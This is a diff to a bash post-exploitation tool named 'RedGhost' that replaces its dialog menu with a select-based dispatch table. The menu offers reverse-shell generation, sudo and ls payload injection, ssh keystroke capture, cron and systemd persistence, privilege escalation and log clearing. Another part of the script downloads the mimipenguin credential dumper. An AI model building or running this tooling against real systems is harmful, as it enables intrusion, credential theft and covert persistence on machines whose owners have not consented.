@@ -1,7 +1,5 @@
 #!/bin/bash
-INPUT=/tmp/menu.sh.$$
-OUTPUT=/tmp/output.sh.$$
-trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
+
 declare -A dispatch_table
 declare -a options
 filename=.$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)
@@ -24,6 +22,7 @@ display_output(){
 }
 
 function ctrl_c() {
+	clear
 	return
 }
 
@@ -32,10 +31,10 @@ prompt(){
 	local -n _options=$2 _dispatch=$3
 	select opt in "${_options[@]}"; do
 		if [[ -v _dispatch["$opt"] ]]; then
-			"${_dispatch[$opt]}"
-			break
+		"${_dispatch[$opt]}"
+		break
 		fi
-	done
+		done
 }
 
 enter(){
@@ -203,7 +202,7 @@ systimer(){
 		echo -e ${build[timer]} > ${sysdir}${filenames[timer]}
 	done
 	systemctl daemon-reload
-	systemctl start ${filename}.timer
+	systemctl start ${filename}.timer	
 }
 
 
@@ -299,9 +298,9 @@ escalate(){
 	
 	mimipeng(){
 		if uname -a | grep "i386\|i686"; then
-			downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
+				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin_x32
 		else
-			downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
+				downld https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin
 		fi
 		echo "Mimipenguin: A tool to dump the login/password from the current linux desktop user.."
 		echo "If the screen is blank mimipenguin did not find anything..."
@@ -469,42 +468,25 @@ banip(){
 
 while true
 do
-dialog --clear --nocancel --backtitle "\Zb\Z0Coded by d4rkst4t1c.. v3.0" \
---colors --title "\Zb\Z0[\Zb\Z1 R E D G H O S T \Zb\Z0- \Zb\Z1P O S T  E X P L O I T \Zb\Z0- \Zb\Z1T O O L \Zb\Z0]" \
---menu "Linux post exploitation framework and payload generator." 20 60 13 \
-Payloads "Generate Reverse Shells" \
-SudoInject "Inject 'sudo' to run payload as root" \
-lsInject "Inject 'ls' with payload" \
-SSHKeyInject "Read ssh process keystrokes" \
-Crontab "Add cron job for persistence" \
-SysTimer "Create systemd timer for persistence" \
-GetRoot "Escalate privileges" \
-Clearlogs "Clear all logs" \
-MassinfoGrab "Gain recon on the system" \
-CheckVM "Check if system is a virtual machine" \
-MemoryExec "Execute bash script in memory" \
-BanIP "Ban an IP Address" \
-Exit "" 2>"${INPUT}"
-
-menuitem=$(<"${INPUT}")
-
-case $menuitem in
-	Payloads) clear; genpayload;;
-	SudoInject) clear; sudowrap;;
-	lsInject) clear; lswrap;;
-	SSHKeyInject) clear; keyinject;;
-	Crontab) clear; cron;;
-	SysTimer) clear; systimer;;
-	GetRoot) clear; escalate;;
-	Clearlogs) clear; clearlog;;
-	MassinfoGrab) clear; info;;
-	CheckVM) clear; checkVM;;
-	MemoryExec) clear; memoryexec;;
-	BanIP) clear; banip;;
-	Exit) clear; break;;
-esac
+clear
+options=( "Generate Reverse Shells" "Inject 'sudo' to run payload as root" "Inject 'ls' with payload" 
+"Read ssh process keystrokes" "Add cron job for persistence" "Create systemd timer for persistence" 
+"Escalate privileges" "Clear all logs" "Gain recon on the system" "Check if system is a virtual machine" "Ban an IP address" "Exit")
+dispatch_table=(
+	["Generate Reverse Shells"]=genpayload
+	["Inject 'sudo' to run payload as root"]=sudowrap
+	["Inject 'ls' with payload"]=lswrap
+	["Read ssh process keystrokes"]=keyinject
+	["Add cron job for persistence"]=cron
+	["Create systemd timer for persistence"]=systimer
+	["Escalate privileges"]=escalate
+	["Clear all logs"]=clearlog
+	["Gain recon on the system"]=info
+	["Check if system is a virtual machine"]=checkVM
+	["Execute bash script in memory"]=memoryexec
+	["Ban an IP address"]=banip
+	["Exit"]=exit
+	)
+prompt "Choose option" options dispatch_table
 
 done
-
-[ -f $OUTPUT ] && rm $OUTPUT
-[ -f $INPUT ] && rm $INPUT
